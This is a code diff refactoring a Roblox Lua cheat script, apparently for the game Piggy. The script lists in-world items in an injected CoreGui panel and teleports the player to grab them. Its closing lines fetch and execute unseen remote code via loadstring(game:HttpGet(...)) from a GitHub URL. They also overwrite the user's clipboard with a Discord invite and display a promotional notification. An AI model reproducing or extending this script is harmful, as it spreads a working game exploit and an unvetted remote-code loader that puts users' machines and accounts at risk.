@@ -2,18 +2,15 @@ local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
-local PiggyGui = Instance.new("ScreenGui")
-PiggyGui.Parent = game:GetService("CoreGui")
+local PiggyGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
 
-local ScrollingFrame = Instance.new("ScrollingFrame")
-ScrollingFrame.Parent = PiggyGui
+local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
 ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
 ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
 ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
 ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
 
-local UIGridLayout = Instance.new("UIGridLayout")
-UIGridLayout.Parent = ScrollingFrame
+local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
 UIGridLayout.CellSize = UDim2.new(0, 90, 0, 90)
 
 local itemCache, frameCache = {}, {}
@@ -44,30 +41,42 @@ UIS.InputChanged:Connect(function(input)
     end
 end)
 
-local function createItemFrame(item)
-    if frameCache[item] then return end
-
-    local itemPos = item.Position
-    local ItemFrame = Instance.new("TextButton")
-    ItemFrame.Parent = ScrollingFrame
-    ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
-    ItemFrame.BackgroundTransparency = 0.95
-    ItemFrame.Size = UDim2.new(0, 100, 0, 100)
-    ItemFrame.Text = ""
-
+local function createViewport(item)
     local Viewport = Instance.new("ViewportFrame")
-    Viewport.Parent = ItemFrame
     Viewport.Size = UDim2.new(1, 0, 1, 0)
     Viewport.BackgroundTransparency = 1
 
     local clone = item:Clone()
     clone.Parent = Viewport
 
-    local camera = Instance.new("Camera")
-    camera.Parent = Viewport
+    local camera = Instance.new("Camera", Viewport)
     camera.CameraType = Enum.CameraType.Fixed
-    camera.CFrame = CFrame.new(itemPos + Vector3.new(0, 3, 0), itemPos)
+    camera.CFrame = CFrame.new(item.Position + Vector3.new(0, 3, 0), item.Position)
     Viewport.CurrentCamera = camera
+
+    return Viewport, clone
+end
+
+local function updateViewport(Viewport, clone, item)
+    if clone then clone:Destroy() end
+    clone = item:Clone()
+    clone.Parent = Viewport
+
+    Viewport.CurrentCamera.CFrame = CFrame.new(item.Position + Vector3.new(0, 3, 0), item.Position)
+    return clone
+end
+
+local function createItemFrame(item)
+    if frameCache[item] then return end
+
+    local ItemFrame = Instance.new("TextButton", ScrollingFrame)
+    ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+    ItemFrame.BackgroundTransparency = 0.95
+    ItemFrame.Size = UDim2.new(0, 100, 0, 100)
+    ItemFrame.Text = ""
+
+    local Viewport, clone = createViewport(item)
+    Viewport.Parent = ItemFrame
 
     ItemFrame.MouseButton1Down:Connect(function()
         if item:FindFirstChild("ClickDetector") then
@@ -79,19 +88,12 @@ local function createItemFrame(item)
             player.Character.HumanoidRootPart.CFrame = originalPos
         end
     end)
-
-    frameCache[item] = ItemFrame
+    frameCache[item] = {Frame = ItemFrame, Viewport = Viewport, Clone = clone}
     local function update()
-        ItemFrame.Visible = item.Transparency < 1
-        if ItemFrame.Visible then
-            for _, child in ipairs(Viewport:GetChildren()) do
-                if child:IsA("Model") or child:IsA("Part") then
-                    child:Destroy()
-                end
-            end
-            local clone = item:Clone()
-            clone.Parent = Viewport
-            camera.CFrame = CFrame.new(itemPos + Vector3.new(0, 3, 0), itemPos)
+        if item.Transparency < 1 then
+            frameCache[item].Clone = updateViewport(Viewport, frameCache[item].Clone, item)
+        else
+            ItemFrame.Visible = false
         end
     end
     update()
@@ -99,10 +101,8 @@ local function createItemFrame(item)
 end
 
 local function onItemAdded(item)
-    local hasClickDetector = item.Parent:FindFirstChild("ClickDetector")
-    local hasClickEvent = item.Parent:FindFirstChild("ClickEvent")
-    if (item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript" and hasClickDetector) or 
-       (hasClickDetector or hasClickEvent) and 
+    if ((item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript") and item.Parent:FindFirstChild("ClickDetector")) or 
+       (item.Parent:FindFirstChild("ClickDetector") or item.Parent:FindFirstChild("ClickEvent")) and 
        not itemCache[item.Parent] then
         itemCache[item.Parent] = true
         task.defer(function() createItemFrame(item.Parent) end)
@@ -111,7 +111,8 @@ end
 
 local function onItemRemoved(item)
     if frameCache[item.Parent] then
-        frameCache[item.Parent]:Destroy()
+        frameCache[item.Parent].Frame:Destroy()
+        frameCache[item.Parent].Clone:Destroy()
         itemCache[item.Parent], frameCache[item.Parent] = nil, nil
     end
 end
@@ -119,14 +120,14 @@ end
 game:GetService("Workspace").DescendantAdded:Connect(onItemAdded)
 game:GetService("Workspace").DescendantRemoving:Connect(onItemRemoved)
 
-for _, item in pairs(Workspace:GetDescendants()) do
+for _, item in pairs(game.Workspace:GetDescendants()) do
     onItemAdded(item)
 end
 
-game:GetService("StarterGui"):SetCore("SendNotification",{
+game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "https://discord.gg/R2dbGKyqqE",
     Text = "Join our community!",
-    Duration = 25;
+    Duration = 25
 })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 setclipboard("https://discord.gg/R2dbGKyqqE")
